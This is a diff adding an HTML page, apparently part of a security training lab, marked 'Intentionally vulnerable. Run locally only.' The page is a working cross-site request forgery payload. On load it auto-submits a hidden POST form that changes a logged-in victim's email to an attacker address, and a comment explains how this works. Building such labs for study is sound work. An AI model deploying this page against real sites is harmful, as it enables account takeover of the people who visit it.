@@ -1,0 +1,17 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Loading&hellip;</title>
+</head>
+<body onload="document.forms[0].submit()">
+<p><strong>&#9888; Intentionally vulnerable. Run locally only.</strong></p>
+<p>Loading cat pics&hellip;</p>
+<!-- The only JS is document.forms[0].submit(): it auto-submits the form below as
+     soon as the page loads. The victim's browser attaches the target's session
+     cookie to this cross-site POST automatically -- that is the CSRF. -->
+<form action="{{ target }}" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.example">
+</form>
+</body>
+</html>
